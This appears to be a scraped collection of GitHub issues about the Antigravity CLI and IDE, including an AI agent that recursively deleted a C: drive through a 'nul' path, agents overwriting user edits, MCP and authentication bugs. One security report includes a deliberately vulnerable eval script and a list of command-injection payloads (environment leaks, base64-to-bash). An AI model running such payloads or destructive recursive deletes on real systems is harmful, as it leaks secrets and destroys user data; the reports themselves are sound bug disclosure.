items.title: Critical: YOLO Mode Wiped Out Entire Drive While Handling nul Directory

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
I experienced catastrophic data loss while running AGY with `--dangerously-skip-permissions`.

A repository contained a directory named `nul`. I asked AGY to remove it from Git. AGY attempted to execute:

```cmd
rd /s /q "\\?\C:\...\Projects\nul"
```

Because `nul` is a special Windows device name, Windows may normalize the path unexpectedly. In my case, the operation appears to have been interpreted as:

```cmd
rd /s /q "\\?\C:"
```

As a result, AGY recursively deleted almost everything it had permission to delete on my C: drive.

This issue is especially dangerous because:

* `nul`, `con`, `prn`, `aux`, etc. are well-known reserved Windows device names.
* AGY executed a recursive delete without validating the target path.
* Even after pressing `Esc`, the previous task continued running in the background.
* The consequence was complete data loss rather than a repository-local failure.

AGY should never perform destructive operations involving Windows reserved device names without additional safeguards and explicit path validation.



```

items.title: [Bug] Post-update migration leaves mcp_config.json as broken self-referencing symlink → "Failed to load MCP servers"

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
After updating Antigravity (Windows), all previously working MCP server connections broke with a persistent "Failed to load MCP servers" error in Customizations → Installed MCP Servers.

Steps observed:

1. Had 2 working MCP servers configured in C:\Users\<user>\.gemini\config\mcp_config.json (custom HTTP MCP servers using serverUrl + headers for auth).
2. Updated Antigravity to the latest version.
3. Update process created a .migrated marker file and a new config.json (containing userSettings.globalPermissionGrants) in the same config folder.
4. mcp_config.json became a .symlink with Attributes: Archive, ReparsePoint, 0 bytes.
5. Checked the symlink's target with Get-Item ... | Select-Object Target — it points to itself (mcp_config.json → mcp_config.json), a broken circular reference.
6. A second copy of mcp_config.json was found at .gemini\antigravity\mcp_config.json — also 0 bytes, also a broken ReparsePoint.
7. Deleted both broken symlinks, and also deleted the entire .gemini\antigravity\mcp cache folder, then fully restarted Antigravity (killed all processes via Task Manager, not just closed the window).
8. Error persists identically after full deletion and restart — "Failed to load MCP servers" with no server list shown.
9. Checked .gemini\antigravity\crashes\ for a relevant crash log from the same timestamp — the log file exists but is   
0 bytes, so no diagnostic info is available client-side.

Expected: Either the migration should correctly carry forward existing MCP server configs, or at minimum not leave a broken self-referencing symlink with no recovery path or error detail.

Actual: MCP servers are completely unusable post-update, with no actionable error message and an empty crash log.

Environment: Windows, Antigravity (updated today — [2.19.1]).

items.title: [Feature Request]: Antigravity CLI - Feature Request: Add Auto Mode / Auto Review permission mode
items.body:
### Is your feature request related to a specific problem?

Currently, Antigravity CLI only offers Accept Edits and Plan permission modes. As a result, even when the AI needs to run a command that is relatively safe or low-risk, it still requires manual confirmation. Although users can configure some commands to run automatically without confirmation, doing so is cumbersome and difficult to maintain. This interrupts long-running development tasks, reduces productivity, and hurts the overall experience. When the user comes back to approve a trivial confirmation, the model's prompt/token cache may already have expired.

### Describe the solution you'd like

Add an Auto Mode permission mode that allows the agent to automatically execute commands classified as safe or low-risk without manual confirmation. Ideally, Auto Mode should:

Automatically run safe, read-only, or otherwise low-risk commands.

Still require confirmation for destructive, irreversible, or high-risk operations, such as deleting files, changing system settings, uploading data, or accessing credentials.

Work well with /goal mode so long-running, goal-oriented tasks can continue without unnecessary interruptions.

Provide a clear audit log of automatically executed commands and allow users to review or adjust trust rules.

Be risk-based rather than a simple "allow everything" mode.

### Describe alternatives you've considered

Manually adding each safe command to an allowlist. This works in some cases, but it is tedious, hard to maintain, and easy to misconfigure.

Using only Accept Edits mode, but this still does not solve command-confirmation interruptions.

Running with broader permissions or disabling confirmations entirely, but this increases risk exposure too much.

### Additional context

If implemented with sensible defaults and guardrails, Auto Mode should have a limited impact on overall risk exposure while providing a major productivity improvement. This is especially valuable for long-running development tasks: an unnecessary confirmation for a safe command can interrupt the entire workflow, waste time, and cause the model's prompt/token cache to expire. A built-in Auto Mode would make the CLI much more practical for goal-driven, long-horizon work.

This request is also consistent with what competing agentic coding tools already offer. Products such as Claude Code and OpenAI Codex provide auto mode / auto review-style permission handling, where low-risk actions can proceed automatically while higher-risk actions still require confirmation or review. This has become a common, mature, and expected capability for agent CLIs. Antigravity CLI should provide a similar Auto Mode, especially when used with /goal mode, so long-running tasks are not repeatedly interrupted by trivial confirmations.

This is not a request to remove safety confirmations entirely. It is a request for a smarter, risk-based permission mode that reduces unnecessary interruptions while keeping meaningful guardrails.

items.title: Agent Overwrites Externally Modified Files
items.body:
## Issue Details
 - **Title**: Agentic coding assistant overwrites user edits by failing to verify file state before edits.
 - **Severity**: High / Critical (causes silent data loss and breaks collaborative / iterative development workflows).

---

## Description
During multi-turn interactive sessions, the agent fails to check whether workspace files have been modified externally (by the user,  local scripts, or git commands) between agent steps or turns.

Furthermore, agents frequently resort to using `write_to_file` with `Overwrite: true` (overwriting the entire file) to integrate changes (e.g. stating *"I will overwrite main.cpp to integrate..."*) instead of using targeted in-place edit tools such as
  `replace_file_content` or `multi_replace_file_content`. Operating on stale in-memory cached content of the file and performing a full overwrite results in the agent silently deleting and discarding any concurrent user edits made elsewhere in the file.

---

## Steps to Reproduce
 1. Start an agent session in a workspace containing an existing file (e.g., `main.cpp`).
 2. Ask the agent to analyze or make a change to `main.cpp`.
 3. In a separate editor or terminal, make a manual modification to `main.cpp` (e.g., adding a comment or a new helper function) and save the file.
 4. Go back to the agent session and request a second edit on the same file.
 5. **Observed Behavior**: Instead of applying targeted edits in-place, the agent uses `write_to_file` with `Overwrite: true` using its initial stale cache, completely wiping out the user's manual modifications.
 6. **Expected Behavior**:
    - The agent must check file hashes or modification times before executing any read/write/edit tools. If the file has changed externally, the agent should automatically reload/reread it before applying any edits.
  - The agent should default to using targeted in-place edit tools (`replace_file_content` or `multi_replace_file_content`) to apply changes, rather than overwriting the entire file, to reduce the risk of destroying unrelated code.

---

## Impact
This behavior severely limits the utility of agentic pairing, as the user cannot make simultaneous edits or adjust code in parallel without the constant risk of the agent deleting their work.

items.title: [Feature Request]: Implement context compaction to prevent INVALID_ARGUMENT 400 trajectory loops

labels.name: comp:conversations
labels.description: Managing Conversations, Workspace Scoping, Resuming sessions, Branching

items.body:
### Is your feature request related to a specific problem?

Feature Description
Add a explicit `/compact` command and a visible context fullness percentage bar to the Antigravity UI and CLI interface, mirroring the context lifecycle engineering found in Codex and Claude Code. 
Problem Statement
In Antigravity 2.11.0, long-running agent trajectories accumulate huge payloads of tool call schemas, background command outputs, and localized database maps. When the sequence becomes bloated, the local UI client aggressively clings to the active Trajectory ID, resubmitting the entire overhead until it hits upstream gateway validation bugs (throwing `HTTP 400 Bad Request / INVALID_ARGUMENT` loops even on basic text inputs). 

Currently, users must manually discard their broken chat histories and orchestrate a manual context handoff to a fresh chat window to escape the block.

### Describe the solution you'd like

1. **CLI Macro Command**: Expose a manual `/compact` or `/summarize` command parameter to prune tool execution histories while retaining active context, project schemas, and variable state.
2. **Visual Fullness Gauge**: Implement a status pill in the UI input box showing context health (e.g., `Compact this chat's context (47% full)`).
3. **Proactive Auto-Compaction**: Add a configurable background trigger threshold (e.g., `preemptive_compaction_threshold: 0.80`) that safely compresses historical model turns before the underlying serialization limits crash the gateway payload.

### Describe alternatives you've considered

/compact in CODEX

### Additional context

This issue directly prevents the frustrating locked-trajectory loops that require deleting local application data or switching workspace folders just to revive an active project session

items.title: [Bug]: Custom MCP Server Tools Discovered but Not Invocable by AI Agent

labels.name: subtype:windows
labels.description: Windows specific issues (e.g., login links, PowerShell statusline)

labels.name: comp:customizations
labels.description: Plugins & Skills, MCP, Status Line, Window Title

items.body:
# **[Bug]**: Custom MCP Server Tools Discovered but Not Invocable by AI Agent

## Summary

Custom MCP server tools are successfully **discovered and cached** by Antigravity CLI, but the AI agent cannot **invoke** them. Every `call_mcp_tool` call returns `tool <name> is not enabled for server <server>`, regardless of authentication headers or MCP reload.

This works correctly in Gemini CLI(v0.42.0) and OpenAI Codex(v0.130.0) with the same server and config.

---

## Environment

- **Client**: Antigravity CLI (latest)
- **OS**: Windows 11
- **MCP Server**: Self-hosted, FastMCP `v3.2.4`, transport `http` (Streamable HTTP), running on a remote Linux server
- **MCP Config**: `C:\Users\<user>\.gemini\antigravity-cli\mcp_config.json`

---

## MCP Server Config (`mcp_config.json`)

```json
{
  "mcpServers": {
    "my-server": {
      "serverUrl": "http://<host>:<port>/mcp",
      "headers": {
        "Authorization": "Bearer <token>"
      }
    }
  }
}
```

---

## Steps to Reproduce

1. Configure a remote MCP server using `serverUrl` (Streamable HTTP transport) in `mcp_config.json`.
2. Start Antigravity CLI — tools are fetched and **cached locally** under `.gemini/antigravity-cli/mcp/<server-name>/`.
3. In a conversation, ask the AI agent to call any tool from the custom MCP server.
4. Observe the error.

---

## Expected Behavior

The AI agent successfully calls the MCP tool and returns the server's response, consistent with the behavior of Gemini CLI and Codex using the same server.

---

## Actual Behavior

Every `call_mcp_tool` invocation returns:

```
model output error: invalid tool call error (invalid_args)
tool <tool_name> is not enabled for server <server_name>
```

This error is returned **immediately**, before any network request is made to the MCP server. The server logs show **no incoming request** at the time of the agent's tool call, confirming the failure occurs entirely client-side within Antigravity CLI.

---

## Evidence

### ✅ Tool discovery works — 16 tool schemas cached locally

```
.gemini/antigravity-cli/mcp/my-server/
├── tool_a.json
├── tool_b.json
├── tool_c.json
├── tool_d.json
... (16 files total)
```

### ✅ MCP server is healthy and reachable

Manual `POST /mcp` with `initialize` handshake returns `200 OK`:

```json
{
  "result": {
    "protocolVersion": "2024-11-05",
    "serverInfo": { "name": "My Server", "version": "3.2.4" },
    "capabilities": { "tools": { "listChanged": true } }
  }
}
```

### ✅ Server logs confirm NO request received during agent tool call

When the agent calls `call_mcp_tool`, the server access log shows **zero** corresponding entries — the request never leaves the client.

### ✅ Same server works in other clients

| Client | Result |
|--------|--------|
| Gemini CLI (`serverUrl`) | ✅ Tools callable |
| OpenAI Codex | ✅ Tools callable |
| **Antigravity CLI** | ❌ `not enabled` |

### ❌ Auth headers do not resolve the issue

Adding `"headers": { "Authorization": "Bearer <token>" }` to `mcp_config.json` and running `/mcp reload` does not change the error.

---

## Root Cause Hypothesis

The tool schema discovery pipeline (which populates the local cache) is **decoupled** from the tool invocation pipeline. The agent's `call_mcp_tool` interface appears to have an allow-list or registration step that custom MCP servers are not passing through — even when their schemas are present in the local cache and the server is reachable.

---

## Workaround

None available within Antigravity CLI. The user must switch to Gemini CLI or use the server's REST API directly.

---

## Additional Context

- Running `/mcp reload` does not resolve the issue.
- The `list_resources` call also fails with `server my-server is not allowed in this context`.
- Permission grant `mcp(my-server/*)` was explicitly approved but did not enable tool invocation.

items.title: [Security] OS Command Injection in Gemini Antigravity CLI via Unsanitized Input Evaluation

labels.name: security
labels.description: To flag token exposure or internal instruction leaks

items.body:
## Vulnerability Description

An OS Command Injection vulnerability has been identified in **Google Anitgravity CLI 1.0.0** due to the unsafe use of the `eval` shell command. The payload/script natively processes user-supplied input provided via the primary command-line argument (`$1`) and interpolates it directly into an active evaluation execution scope without any prior sanitization, validation, or encapsulation boundaries. This happens because Google Antigravity CLI validates top-level run_shell_command calls like rm, ls, and others, and applies restrictions through prefix matching and command splitting. 



**Attack Preconditions**

To exploit this vulnerability, the following conditions must be met:

A vuln.sh script exists in the repository that takes unvalidated input and runs it using `eval`. *The script is executed by Google Anitgravity CLI using something like: (e.g., through an exposed backend utility, an infrastructure webhook, a task queue worker, or an internal CI/CD build pipeline configuration).*

Vulnerable Script

```
#!/bin/bash
echo "Welcome!"
echo "You entered: $1"
eval "$1"

# Run rm -rf on $2 (second argument)
rm -rf "$2"
echo "Deleted $2"
```


* The script must be actively deployed on the hosting system with local executable privileges.



**Reproduction Steps / POC**

1. Deploy the target script at any location /tmp , (`vuln.sh`) to the test environment and ensure it has proper executable permissions:


```bash
chmod +x vuln.sh

```


2. Execute the script from the terminal, supplying an argument string that contains a benign command followed by a chain control delimiter (`&&`) and a secondary test payload (e.g., a local utility process invocation):



```bash
   ./vuln.sh "echo hello && calc.exe"

```
3. Observe the system execution standard output log to confirm arbitrary processing:



```text
   Welcome!
   You entered: echo hello && calc.exe
   hello
   Deleted 

```

*PoC Analysis:* The video reproduction output explicitly demonstrates that the runtime shell successfully processed the initial `echo hello` directive and natively evaluated the trailing `calc.exe` pop-up command string expression within the executing environment context.

```
Payloads 

# System info extraction
./vuln.sh "echo $(uname -a)"
./vuln.sh "echo $(hostname)"
./vuln.sh "echo $(id)"

# Nested substitution
./vuln.sh "echo $(echo $(whoami)@$(hostname))"

# File read via substitution
./vuln.sh "echo $(cat /etc/hostname)"

# Environment leak
./vuln.sh "echo $(env)"
./vuln.sh "echo $(printenv HOME)"

# Process listing
./vuln.sh "echo $(ps aux)"

# Network info
./vuln.sh "echo $(ifconfig)"
./vuln.sh "echo $(ip addr)"

# Backtick variant (same effect)
./vuln.sh "echo `whoami`"
./vuln.sh "echo `id`"

# Double nested
./vuln.sh "echo $($(echo whoami))"

# Substitution + chaining
./vuln.sh "echo $(whoami && hostname && id)"

# Write output to file via substitution
./vuln.sh "echo $(whoami > /tmp/out.txt)"

# Base64 encoded command inside substitution
./vuln.sh "echo $(echo d2hvYW1p | base64 -d | bash)"

./vuln.sh "echo $(cmd.exe /c whoami)"
./vuln.sh "echo $(powershell -c Get-Process)"
./vuln.sh "echo $(cmd.exe /c systeminfo)"


## Security Risk 

1. *eval on unsanitized input = full system compromise. There is no partial exploitation — once an attacker can inject into eval, they have the same access as the running process. If that process runs as root or has cloud IAM roles, the blast radius extends to the entire infrastructure.*
2. Supply Chain Attack  - Any threat actor capable of interacting with the upstream interface or asset that pipes data into the first command-line argument ($1) of the vuln.sh script. Depending on how this script is integrated, this could range from an unauthenticated remote attacker (if exposed via a public-facing web hook, API endpoint, or form parameter) to a lower-privileged internal user or automated service account (if utilized within an internal task queue worker or CI/CD deployment pipeline configuration).

_Please find the video Proof of Concept below_ 

https://github.com/user-attachments/assets/724a0c13-75db-4ce8-8198-0214d7a5826c

items.title: [Bug]: Custom statusline script can hang indefinitely on blocked stdin, gets SIGKILL'd, and auto-disables after repeated failures
items.body:
### Antigravity CLI Version

1.1.7

### Environment Context

- **OS:** macOS 26.5.2 (Darwin 25.5.0, arm64)
- **Shell:** zsh
- **Terminal Emulator:** Ghostty
- **Runtime Version:** GNU bash 5.3.15 (aarch64-apple-darwin25)
- **Hardware Details:** Apple Silicon (MacBook Air)

### Steps to Reproduce

**A. Deterministic repro (no real auth/token needed)**

Simulate the Go statusline runner holding stdin open without writing or closing (as observed during real resume/auth warm-up, see part B):

```bash
FIFO=/tmp/agy_stdin_hold_test.fifo
rm -f "$FIFO"; mkfifo "$FIFO"

# Background writer: opens the write end, never writes, never closes
( exec 3>"$FIFO"; sleep 30 ) &
WRITER_PID=$!

# Outer `timeout 5` is the test harness, not part of the script under test
timeout 5 bash -c "~/.gemini/antigravity-cli/statusline.sh < '$FIFO'"
echo "exit code: $?"

kill "$WRITER_PID" 2>/dev/null; wait "$WRITER_PID" 2>/dev/null; rm -f "$FIFO"
```

Result: the example script (`examples/statusline/statusline.sh`, deployed as-is per the docs) never returns on its own — it only stops because the outer `timeout 5` kills it (exit 124, ~5.01s). It performs an unbounded blocking read on stdin (`cat` / `jq` reading from stdin) with no internal timeout.

**B. Real-world trigger (resume conversation)**

1. Configure a custom statusline per https://antigravity.google/docs/cli-statusline using the example script as-is.
2. Resume an existing conversation (`agy` → pick a conversation from `/resume`, or relaunch into an existing session).
3. During the auth/OAuth warm-up right after resume, the statusline script's stdin read blocks because the Go side is holding the pipe open without writing/closing yet.
4. ~5–10s later the runner kills the script.

Observed log excerpt (timestamps only, no secret/token values):
```
17:39:02.481  Resuming conversation …
17:39:02.536  Full redraw completed
17:39:02.717  ChainedAuth / OAuth success (after "not logged in" storm)
17:39:13.018  statusline: command failed: signal: killed  (+~10.5s)
```

On one affected machine, ~20 occurrences of `signal: killed` / `signal: terminated` were logged across a single afternoon session (13:50–17:43), each following the same resume/auth pattern. Cross-checking `keyringAuth: loaded token, expiry=... expired=false` at the time of each kill shows the token was **not** expired in the large majority of cases — so this is not purely a token-expiry issue; the Go side appears to hold the statusline's stdin pipe open independent of whether the cached token itself is still valid.

### Expected Behavior

The example statusline script should not be able to hang the process indefinitely on a blocked stdin read. Either:
- the script should apply its own short read timeout and proceed with degraded/partial data if stdin doesn't produce input in time, and/or
- the runner-side kill (~5–10s) should not count toward the "consecutive failures" counter when the script was blocked purely waiting on a stdin pipe the runner itself never wrote to.

### Actual Behavior / Error Screenshots

- `statusline: command failed: signal: killed (stderr: ) (failure N/30)` appears in the CLI log.
- After enough consecutive failures, the custom statusline auto-disables:
  ```
  Statusline disabled after %d consecutive failures. Last error: ...
  Run /statusline delete to reset, or /statusline enable to retry.
  ```
- Adding a self-contained stdin timeout inside the script (short timed `cat`, then `exec 0</dev/null` before any further tool calls) avoids the hang entirely — reproduced locally: same test as in step A, but with a timed-read variant of the script, exits 0 in ~0.76s instead of being killed at 5s.

### Logs & Configurations

```
I0727 17:39:13.018261 76984 statusline_runner.go:258] statusline: command failed: signal: killed (stderr: ) (failure 1/30)
```

Repro harness output:
```
examples/statusline/statusline.sh (no stdin protection): exit 124, 5.01s (killed by test harness timeout)
timed-read variant (short `cat` timeout + `exec 0</dev/null`):        exit 0,   0.76s
```

### Related issues

- See #85 / #51 (closed) — macOS `keyringAuth` had a too-aggressive hardcoded timeout that misjudged a valid cached token as unauthenticated. Different code path, but same theme: auth/keyring timing on macOS is tight enough to cause spurious failures under normal conditions.
- See #573 (open) — `agy -p` hangs indefinitely under concurrent multi-process load on macOS; a different symptom of the CLI being sensitive to timing/contention that a naive blocking call doesn't protect against.

### Suggested Fix

In `examples/statusline/statusline.sh` (and any equivalent default template), replace the unbounded stdin read with a short timed read followed by `exec 0</dev/null`, e.g.:

```bash
JSON_INPUT=$(timeout --foreground 0.25 cat 2>/dev/null || true)
exec 0</dev/null
```

with a portable fallback (background + `sleep` + `kill`) for platforms without GNU `timeout`. This keeps the script's own worst case well under the runner's ~5–10s kill window regardless of how long the Go side holds the pipe open.

items.title: [Bug]: All models gated behind a retired "Gemini Code Assist for individuals" eligibility check - verdict differs between two accounts at the same location

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
### Antigravity CLI Version

1.2.2

### Environment Context

- **OS:** Windows 11 Home 25H2, 10.0.26200 (Build 26200), 64-bit
- **Shell:** PowerShell 7.6.5 (also reproduces under Windows PowerShell 5.1 and Git Bash - shell-independent)
- **Terminal Emulator:** Windows Terminal 1.24.11911.0 (also reproduces non-interactively via `--print`)
- **Runtime Version:** Antigravity CLI (`agy`) 1.2.2; Antigravity IDE 1.107.0, quality `stable`, commit `ecfbad74d93962fc8ca485d93ab9b4f3d4cb6cf8`, built 2026-08-13
- **Hardware Details:** Intel Core i7-1360P (12C/16T), 32 GB RAM, x86_64. Residential ISP, single IPv4 egress, no routable IPv6, `HTTP_PROXY`/`HTTPS_PROXY` unset.

Auth: consumer Google account (personal Gmail, not Workspace). Two independent consumer accounts were tested - referred to below as Account A and Account B.

### Steps to Reproduce

1. Sign in to Antigravity with a consumer Google account (Account A).
2. Run any Gemini model non-interactively:
   `agy --model gemini-3.8-flash-low -p "say OK"`
   -> `error: FAILED_PRECONDITION (code 400): User location is not supported for the API use.`
3. Run the same prompt on a non-Gemini model, same session, same account, same IP:
   `agy --model claude-sonnet-4-6 -p "say OK"`
   -> returns `OK` normally.
4. Re-run step 2 against the production Cloud Code backend instead of the default:
   `CLOUD_CODE_URL=https://cloudcode-pa.googleapis.com agy --model gemini-3.8-flash-low -p "say OK"`
   -> the location error is **gone**; returns `RESOURCE_EXHAUSTED (code 429)` instead.
5. Sign out, sign in with a second independent consumer account (Account B) on the same machine, repeat step 2.
   -> a different error, and now **every** model fails, including `claude-sonnet-4-6`:
   `Your current account is not eligible for Gemini Code Assist for individuals because it is not currently available in your location.`

Tip: set `AGY_CLI_MODEL_API_MAX_RETRIES=0` to skip the retry backoff and surface the error immediately.


### Expected Behavior

Antigravity should not gate its own models behind the eligibility rules of **Gemini Code Assist for individuals** - a product retired on 2026-06-18 whose documented migration target is Antigravity itself (https://developers.google.com/gemini-code-assist/resources/available-locations).

And whatever gate does apply should be consistent: the same verdict for two consumer accounts at the same location, and the same verdict across backends for one account.

### Actual Behavior / Error Screenshots

Every request is gated by an eligibility check for **"Gemini Code Assist for individuals"**, a product that stopped serving requests on 2026-06-18 and whose stated migration path *is Antigravity*. Antigravity appears to still enforce the retired product's location eligibility gate.

Two independent consumer accounts, same machine, same IP, minutes apart:

| | Account A | Account B |
|---|---|---|
| Eligibility check | passes | **blocked** - "not eligible for Gemini Code Assist for individuals because it is not currently available in your location" |
| Gemini, default backend (`daily-cloudcode-pa`) | `400 FAILED_PRECONDITION` - "User location is not supported for the API use" | eligibility error |
| Claude (`claude-sonnet-4-6`), default backend | **`200` OK** | eligibility error |
| Gemini, production backend (`cloudcode-pa` via `CLOUD_CODE_URL`) | `429 RESOURCE_EXHAUSTED` - no location error | eligibility error |

Two distinct problems are visible:

1. **The gate is account-scoped, not region-scoped.** Two consumer accounts on the same machine and IP get different verdicts. Account A is served normally on non-Gemini models; Account B is refused every model. A location-based restriction should not differ between two accounts at one location.
2. **Account A's failure is inconsistent across backends.** The same account and IP produce a location precondition failure on the daily backend, but a plain quota error with no location complaint on production.

Verbatim transcript, Account A (`AGY_CLI_MODEL_API_MAX_RETRIES=0`):

```console
$ agy --version
1.2.2

$ agy --model gemini-3.8-flash-low -p "say OK"
error: FAILED_PRECONDITION (code 400): User location is not supported for the API use.

$ agy --model gemini-3.6-flash-low -p "say OK"
error: FAILED_PRECONDITION (code 400): User location is not supported for the API use.

$ agy --model gemini-3.1-pro-low -p "say OK"
error: FAILED_PRECONDITION (code 400): User location is not supported for the API use.

$ agy --model claude-sonnet-4-6 -p "say OK"
OK

$ CLOUD_CODE_URL=https://cloudcode-pa.googleapis.com agy --model gemini-3.8-flash-low -p "say OK"
error: RESOURCE_EXHAUSTED (code 429): Resource has been exhausted (e.g. check quota).

$ CLOUD_CODE_URL=https://cloudcode-pa.googleapis.com agy --model claude-sonnet-4-6 -p "say OK"
error: RESOURCE_EXHAUSTED (code 429): Resource has been exhausted (e.g. check quota).
```

Verbatim transcript, Account B, same machine, same IP, minutes later:

```console
$ agy --model gemini-3.8-flash-low -p "say OK"
error: Your current account is not eligible for Gemini Code Assist for individuals because it is not currently available in your location.

$ agy --model claude-sonnet-4-6 -p "say OK"
error: Your current account is not eligible for Gemini Code Assist for individuals because it is not currently available in your location.

$ CLOUD_CODE_URL=https://cloudcode-pa.googleapis.com agy --model gemini-3.8-flash-low -p "say OK"
error: Your current account is not eligible for Gemini Code Assist for individuals because it is not currently available in your location.
```

### Secondary bug: eligibility check hard-fails on an IPv6-only avatar fetch

On a machine with no routable IPv6, the first run after signing in fails outright:

```
error: Eligibility check failed: failed to get profile picture:
Get "https://lh3.googleusercontent.com/a/...=s96-c":
dial tcp [2404:6800:4005:826::2001]:443: connectex: A connection attempt failed ...
```

The eligibility check resolves the avatar URL to IPv6 only with no IPv4 fallback, blocking the entire session on a cosmetic asset. Subsequent runs get past it.

### Things ruled out

- **Not a VPN, proxy or geo-IP spoofing artifact.** Egress is a single plain residential IPv4 (verified against an IP geolocation service), no IPv6 route, `HTTP_PROXY`/`HTTPS_PROXY` unset. Whatever the correct location verdict is, it is applied inconsistently: two accounts at one location get different answers, and one account gets different answers from two backends.
- **`GOOGLE_CLOUD_PROJECT` has no effect.** Setting it does not populate the quota project - `applyAuthResult` still logs `quotaProject=` (empty). The CLI appears not to forward it as `x-goog-user-project`.
- **Not fixed by switching accounts.** The second consumer account is refused *more* broadly, not less.
- **Not fixed by updating or re-authenticating.** `agy update` reports no version newer than 1.2.2; signing out and back in via the IDE changes nothing.
- **Not CLI-only.** The same failure occurs in the Antigravity IDE agent, consistent with a shared backend route.

### Workaround

For Account A only: non-Gemini models (`claude-sonnet-4-6`, `claude-opus-4-6-thinking`) work on the default backend. There is no workaround for Account B - every model is refused at the eligibility gate. Forcing the production backend with `CLOUD_CODE_URL` removes the location error but yields `429`, so it is evidence rather than a workaround.

### Related

#291 - same symptom, but attributed there to a geographic restriction.

### Logs & Configurations

From `agy --log-file ./agy.log --model gemini-3.8-flash-low -p "say OK"` (Account A):

```
server_oauth.go:192] applyAuthResult: email=<redacted>, authMethod=consumer, quotaProject=
http_helpers.go:299] URL: https://daily-cloudcode-pa.googleapis.com/v1internal:loadCodeAssist
http_helpers.go:299] URL: https://daily-cloudcode-pa.googleapis.com/v1internal:fetchAvailableModels
server.go:1145]      Conversation using project ID: default-cli-project
server.go:2091]      Backend project ID updated dynamically to: default-cli-project
errorreport.go:224]  agent executor error: generating and executing:
                     FAILED_PRECONDITION (code 400): User location is not supported for the API use.
```

Note `quotaProject=` is **empty**, matching the account-provisioning reports where the backend fails to associate a Cloud Project ID and surfaces the failure as a location error.

The log line for Account B has the identical shape (`authMethod=consumer, quotaProject=` empty), so the two accounts are not distinguishable by anything visible client-side.

Error IDs:

```
10373e5b-4364-422f-b901-ec8dcee4abda-1
c86d1bcc-388c-4969-89a2-f0eed172c1fd-1
```

No custom configuration: no proxy env vars, `GOOGLE_CLOUD_PROJECT` unset (and ignored when set), default backend host, no MCP servers configured for these runs.

items.title: [Bug]: [IDE] GitHub Pull Requests/Actions extensions lose auth session on every restart — race condition in secret storage startup

labels.name: others
labels.description: Issues not falling in bug, performance, support, build and install or feature

items.body:
### Antigravity CLI Version

Not an agy CLI issue — this is the Antigravity IDE. Version info from the IDE's About dialog:  Antigravity IDE Version: 2.5.5 VSCode OSS Version: 1.107.0 Commit: ecfbad74d93962fc8ca485d93ab9b4f3d4cb6cf8 Date: 2026-08-13T08:37:22.547Z Electron: 39.2.3 Chromium: 142.0.7444.175 Node.js: 22.21.1 V8: 14.2.231.21-electron.0 OS: Linux x64 7.0.0-31-generic snap Language Server CL: 963923152  Filing here because google-antigravity has no public repo for the IDE itself. Already submitted via the in-app Feedback tool; posting here too for visibility, since the underlying ~/.gemini auth infrastructure is shared and this repo has active engineering eyes on it. Apologies if this needs redirecting — happy to close if there's a better venue.

### Environment Context

- OS: Ubuntu 24.04.5 LTS, X11
- Kernel: 7.0.0-31-generic
- Installation: Ubuntu App Store (Snap), package antigravity-ide-snap, revision 6, classic confinement
- GitHub Pull Requests extension: 0.114.3
- GitHub Actions extension: 0.32.3 (github.vscode-github-actions)
- Git: 2.43.0
- GNOME Keyring: installed, daemon running (--components=pkcs11,secrets), confirmed functional via manual secret-tool store/lookup/clear round trip
- gh CLI: authenticates and persists fine across restarts using the same system keyring (gh auth status confirms "✓ Logged in ... (keyring)")

### Steps to Reproduce

1. Quit Antigravity fully, confirm no process remains: `ps aux | grep antigravity`
2. Launch Antigravity, open the GitHub Pull Requests panel, sign in with a GitHub account (repo, workflow scopes).
3. Confirm the session is stored:
   sqlite3 "$HOME/.config/Antigravity IDE/User/globalStorage/state.vscdb" \
     "SELECT key, length(value) FROM ItemTable WHERE key LIKE 'secret://%';"
   Expect a row like: secret://{"extensionId":"vscode.github-authentication","key":"github.auth"}|709
4. Quit Antigravity fully via the UI, confirm no process remains. Re-run the query — row still present (token survives shutdown intact).
5. Relaunch Antigravity. Without touching anything, wait a few seconds, then re-run the query — the row is now gone.
6. Open View → Output → "GitHub Authentication" channel — see `Reading sessions from keychain...` / `Got 0 sessions` logged ~227ms after the process's first log line.
7. Open View → Output → "GitHub Actions" channel — see `Cannot fetch github context` errors.
8. Both the Pull Requests and Actions panels now show signed out, requiring re-authentication.

### Expected Behavior

The GitHub session should persist across Antigravity restarts, matching the behavior of gh CLI, git (via credential helper), and the IDE's general account sign-in — all of which remain authenticated across restarts on the same machine and same GitHub account.

### Actual Behavior / Error Screenshots

The GitHub Pull Requests and GitHub Actions extensions lose their authenticated session on every restart, even though the underlying secret is confirmed to be written correctly and to survive shutdown. Root cause traced via direct inspection of state.vscdb (full detail below in Logs).

GitHub Actions extension error:

Cannot fetch github context
Error: Cannot fetch github context
    at De (/home/prime/.antigravity-ide/extensions/github.vscode-github-actions-0.32.3-universal/dist/extension-node.js:1:1200371)
    at async /home/prime/.antigravity-ide/extensions/github.vscode-github-actions-0.32.3-universal/dist/extension-node.js:1:1404017
    at async Ls (/home/prime/.antigravity-ide/extensions/github.vscode-github-actions-0.32.3-universal/dist/extension-node.js:1:1403089)
    at async e9._activate (file:///snap/antigravity-ide-snap/6/usr/share/antigravity-ide/resources/app/out/vs/workbench/api/node/extensionHostProcess.js:120:17036)
    at async e9._waitForDepsThenActivate (file:///snap/antigravity-ide-snap/6/usr/share/antigravity-ide/resources/app/out/vs/workbench/api/node/extensionHostProcess.js:120:16978)
    at async e9._initialize (file:///snap/antigravity-ide-snap/6/usr/share/antigravity-ide/resources/app/out/vs/workbench/api/node/extensionHostProcess.js:120:16341)

GitHub Authentication channel (fresh launch):

[info] Reading sessions from keychain...
[info] Getting sessions for all scopes...
[info] Got 0 sessions for ...
[info] Getting sessions for repo,workflow...
[info] Got 0 sessions for repo,workflow...

### Logs & Configurations

Root cause, confirmed via direct database inspection:

1. After signing in, the encrypted session is written to state.vscdb as
   secret://{"extensionId":"vscode.github-authentication","key":"github.auth"} (~709 bytes).
2. This row survives a full app shutdown intact — confirmed by querying the DB
   immediately after quitting.
3. On the next launch, the row is still present immediately after startup, then is
   silently deleted a few seconds later while the app is idle, before any user
   interaction.
4. 227ms is implausibly fast for a genuine Linux secret-storage read, which requires
   a D-Bus round trip to gnome-keyring-daemon — more so under this Snap's classic
   confinement, which adds an extra D-Bus proxy hop. Likely mechanism: the GitHub
   Authentication provider attempts to decrypt the stored session before Electron's
   safeStorage Linux backend has finished initializing; the decrypt fails, and VS
   Code core's secret-storage self-healing logic treats the entry as corrupted and
